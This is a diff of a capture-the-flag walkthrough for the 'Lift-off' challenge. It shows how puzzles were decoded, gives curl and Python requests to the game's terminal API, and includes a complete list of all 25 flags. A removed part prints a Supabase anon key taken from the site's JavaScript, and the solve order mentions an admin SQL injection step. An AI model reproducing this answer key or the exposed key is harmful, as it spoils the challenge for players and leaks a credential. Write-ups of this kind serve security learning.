-```
-
-```python
-import codecs
-codecs.decode('pelcgb', 'rot_13')  # 'crypto'
-```
-
-Flag: **`CTF{crypto}`**
-
----
-
-### Flag 20: `CTF{1_4m_fr33}`
-
-**File:** `/home/user/encoded_data.txt`
-
-```python
-import base64
-b64 = "SSBhbSBub2JvZHkncyAibWFzdGVyIiBJIGFtIG15IG93biBjcmVhdGlvbiBteSBvd24gc2FsdmF0aW9uIEkgYW0gZnJlZQ=="
-print(base64.b64decode(b64).decode())
-# I am nobody's "master" I am my own creation my own salvation I am free
-```
-
-Leet the ending: **I am free** → **`1_4m_fr33`**
-
-Flag: **`CTF{1_4m_fr33}`**
-
----
-
-### Flag 21: `CTF{n3ur4l15_m4rbl3}`
-
-**File:** `/home/user/deleted.txt`
-
-Three layers:
-
-**Layer 1 — Binary matrix:**
-```
-[[01001110, 01000101], [01010101, 01010010], [01000001, 01001100], [01001001, 01010011]]
-→ NE UR AL IS → NEURALIS
-```
-
-**Layer 2 — Hex string:**
-```
-49 20 63 61 6d 65 ... → "I came with stone, I left you marble"
-→ key word: MARBLE
-```
-
-**Layer 3 — Caesar cipher (shift 9):**
-```
-dwmnablxan kncfnnw cqn tnhb fruu pajwc hxd cqn jllnbb tnh
-→ underscore between the keys will grant you the access key
-```
-
-Combine keys with underscore: **`NEURALIS` + `MARBLE`** → leet → **`n3ur4l15_m4rbl3`**
-
-Flag: **`CTF{n3ur4l15_m4rbl3}`**
-
-Full decode proof: `images/proof-puzzle-decode.txt`
-
----
-
-### Flag 25: `CTF{r3v3rs3}`
-
-**File:** `/home/classified/memory_fragment.txt` (requires Level 2)
-
-Binary spells: **`reverse`** (with trailing bits)
-
-Hint says to reverse the concept → leet **`r3v3rs3`**
-
-Flag: **`CTF{r3v3rs3}`**
-
----
-
-## Phase 6 — Story Endings (Flags 16–18)
-
-### Reaching the ending
+Discovery path I used: grep the client source after reaching the vault.
 
 ```bash
-cd /root/vault
+grep -r "forensics_expert" ctf-client/lift-off/src/
+```
+
+Alternate: brute the six strings in `VALID_PASSKEYS` against `run pleasedont.exe <guess>`.
+
+### Ending flags
+
+```bash
 run pleasedont.exe forensics_expert
 ```
 
-This launches the **AI conversation** with The Anomaly. Your final choice determines the ending.
+Choose in the UI, or call the API directly. Good ending uses **`aiChoice: "kill"`** (not `"destroy"`).
 
-### Flag 16 — Bad Ending (Join): `CTF{j01n3d_th3_4n0m4ly_c0nsc10usn3ss_m3rg3d}`
+Live PoC:
 
-Choose to **join** the Anomaly.
-
-API: `"aiChoice": "join"`
-
-### Flag 17 — Good Ending: `CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}`
-
-Choose to **destroy** the Anomaly.
-
-API: `"aiChoice": "kill"` *(counter-intuitive name — "kill" = good ending)*
-
-### Flag 18 — Master Flag: `CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}`
-
-Also awarded on the **good ending** alongside Flag 17.
-
-**Live API proof (`images/proof-terminal-flags.txt`):**
-```json
-{
-  "flag": "CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}",
-  "master_flag": "CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}",
-  "ending": "good",
-  "output": "The Anomaly's systems cascade into failure..."
-}
-```
-
-**API call:**
 ```bash
-curl -X POST https://lift-off-ctf.onrender.com/run \
+curl -s -X POST https://lift-off-ctf.onrender.com/run \
   -H "Content-Type: application/json" \
   -d '{
     "path": "/root/vault/pleasedont.exe",
     "user": "root",
     "passkey": "forensics_expert",
     "aiChoice": "kill",
-    "userPasskeys": ["crypto_master","reverse_engineer","forensics_expert"],
-    "userFlags": [],
-    "session_id": "ending_demo"
+    "userPasskeys": ["crypto_master","reverse_engineer"],
+    "userFlags": []
   }'
 ```
 
----
-
-## Submitting Flags
-
-![Flags submission page](images/02-flags-page.png)
-
-Visit `/flags`, enter username + flag. Backend RPC: `submit_flag(username_input, flag_input, client_metadata)`.
-
-Example valid responses:
-```
-✅ Correct flag! +5 points
-✅ Correct flag! +50 points
-❌ Invalid flag
+```json
+{
+  "flag": "CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}",
+  "master_flag": "CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}",
+  "ending": "good",
+  "passkey_granted": "forensics_expert",
+  "new_level": 4
+}
 ```
 
----
+Bad ending: `"aiChoice": "join"`
 
-## Recommended Solve Order
-
-```
-1.  Homepage source code          → CTF{w3lc0m3_4b04rd}
-2.  robots.txt                      → CTF{Cr4wl_st3alth_m0d3}
-3.  Random 404 URL                  → CTF{unch4rt3d_1nt3rf4c3}
-4.  /backup password + backup.zip   → CTF{m1nd_pr0b3_2387}, markers 22–24
-5.  /internal-communications        → CTF{1nt3rn4l_c0mmun1c4t10ns}
-6.  /admin SQLi                     → terminal access
-7.  Terminal cat/run/decode         → flags 6–15, 19–21, 25
-8.  pleasedont.exe ending           → flags 16–18
-9.  Submit all at /flags
-```
+**Flags:**
+- Bad: `CTF{j01n3d_th3_4n0m4ly_c0nsc10usn3ss_m3rg3d}`
+- Good: `CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}`
+- Master (good only): `CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}`
 
 ---
 
-## Appendix — API Reference & Decoding Cheatsheet
+## 13. Submit everything
 
-### Supabase anon key (from JS bundle)
-```
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJmaHBqaGJwemxmdGpseHZkY3luIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQwNTc4NTMsImV4cCI6MjA2OTYzMzg1M30.nv5--i7Ky-KWB2FCIpO2q7xBaMxMtK-twuo3LACV744
-```
+![Flags page](images/02-flags-page.png)
 
-### Terminal API quick test
-```python
-import json, urllib.request, urllib.parse
+`/flags` → RPC `submit_flag(username_input, flag_input, client_metadata)`
 
-BASE = "https://lift-off-ctf.onrender.com"
-session = "demo"
-passkeys = "crypto_master,reverse_engineer,forensics_expert"
+---
 
-qs = urllib.parse.urlencode({
-    "path": "/home/user/mission_briefing.txt",
-    "user": "user",
-    "session_id": session,
-    "userPasskeys": passkeys,
-})
-with urllib.request.urlopen(f"{BASE}/file?{qs}") as r:
-    print(r.read().decode())
-```
+## Complete flag list (25)
 
-### Decode cheatsheet
+In discovery order:
 
-| Technique | Example | Result |
-|-----------|---------|--------|
-| ROT13 | `pelcgb` | `crypto` |
-| Base64 | `SSBhbS...` | I am free... |
-| Binary → ASCII | `01000011...` | CTF{...} |
-| Hex → ASCII | `43 54 46` | CTF |
-| Caesar −9 | `dwmnablxan...` | underscore between the keys... |
-| Base64 chain | Chen diag sectors | CTF{d1g1t4l_1nt3rf4c3_3rr0r} |
-| Custom alphabet | `afecrtfe` | `redacted` (vault audio lore) |
+| # | Flag | How I got it |
+|---|------|--------------|
+| 1 | `CTF{w3lc0m3_4b04rd}` | JS bundle / hidden div |
+| 2 | `CTF{Cr4wl_st3alth_m0d3}` | robots.txt |
+| 3 | `CTF{unch4rt3d_1nt3rf4c3}` | 404 page |
+| 4 | `CTF{m1nd_pr0b3_2387}` | backup.zip incident report |
+| 5 | `CTF{d1g1t4l_1nt3rf4c3_3rr0r}` or `CTF{61t1t4l_1nt3rf4c3_3rr0r}` | Chen log base64 — see §6b |
+| 6 | `CTF{c0n5c10u5n355_15_d161t4l}` | quantum_core_diagnostics.log |
+| 7 | `CTF{b3h4v10r4l_4n4ly515_c0mpl3t3}` | reeves_research_notes.txt |
+| 8 | `CTF{1nt3rn4l_c0mmun1c4t10ns}` | Supabase ICMessage idChat=2 |
+| 9 | `CTF{w3lc0m3_t0_th3_4n0m4ly}` | mission_briefing.txt |
+| 10 | `CTF{sh1p_l0gs_f0und}` | ship_logs.txt |
+| 11 | `CTF{crypto}` | ROT13 encrypted_message.txt |
+| 12 | `CTF{1_4m_fr33}` | base64 encoded_data.txt |
+| 13 | `CTF{n3ur4l15_m4rbl3}` | deleted.txt layers |
+| 14 | `CTF{sn4k3_0v3rl0rd}` | Snake minigame |
+| 15 | `CTF{l3v3l_2_unl0ck3d}` | access_granted.txt binary |
+| 16 | `CTF{b1t_0p3r4t10ns_m4st3r}` | unknown_bin21.txt DUMP |
+| 17 | `CTF{b1t_pr0c3ss0r}` | cpu_analysis.log binary |
+| 18 | `CTF{b1n4ry_4r1thm3t1c_pr0}` | binary.txt UNKNOWN DUMP |
+| 19 | `CTF{r3v3rs3}` | memory_fragment.txt |
+| 20 | `CTF{s1m0n_s4ys_y0u_w1n}` | Simon minigame |
+| 21 | `CTF{r00t_4cc3ss_gr4nt3d}` | root_access_granted.txt |
+| 22 | `CTF{b3h3xd4_d3v31c0p3r}` | signal.txt hex blocks |
+| 23 | `CTF{j01n3d_th3_4n0m4ly_c0nsc10usn3ss_m3rg3d}` | bad ending |
+| 24 | `CTF{4n0m4ly_d3str0y3d_hum4n1ty_s4v3d}` | good ending |
+| 25 | `CTF{m4st3r_0f_4ll_d0m41ns_4n0m4ly_d3f34t3d}` | good ending master_flag |
 
-### Files in this solution folder
+---
+
+## Proof artifacts in this folder
 
 ```
 ctf solution/
-├── WALKTHROUGH.md          ← this file
+├── WALKTHROUGH.md              ← this file
+├── PASSKEYS_DEEP_DIVE.md       ← passkey mechanics
 └── images/
     ├── 01-homepage.png
     ├── 02-flags-page.png
@@ -811,4 +657,23 @@ ctf solution/
 
 ---
 
-*Walkthrough complete. All 25 flags documented with concepts, commands, and proof-of-concept output.*
+## Quick reference — terminal API
+
+```bash
+# Read file
+curl "https://lift-off-ctf.onrender.com/file?path=/home/user/ship_logs.txt&user=user&userPasskeys="
+
+# Run executable
+curl -X POST https://lift-off-ctf.onrender.com/run \
+  -H "Content-Type: application/json" \
+  -d '{"path":"/home/user/2nak3.bat","user":"user","score":100,"passkey":"crypto_master","userPasskeys":[],"userFlags":[]}'
+
+# Check level
+curl "https://lift-off-ctf.onrender.com/level?userPasskeys=crypto_master,reverse_engineer,forensics_expert"
+```
+
+Passkeys: see [PASSKEYS_DEEP_DIVE.md](./PASSKEYS_DEEP_DIVE.md).
+
+---
+
+*All PoCs re-run against live infrastructure and local source in `/Users/shaysapozhnikov/Desktop/Lift-off-ctf` — June 2025.*
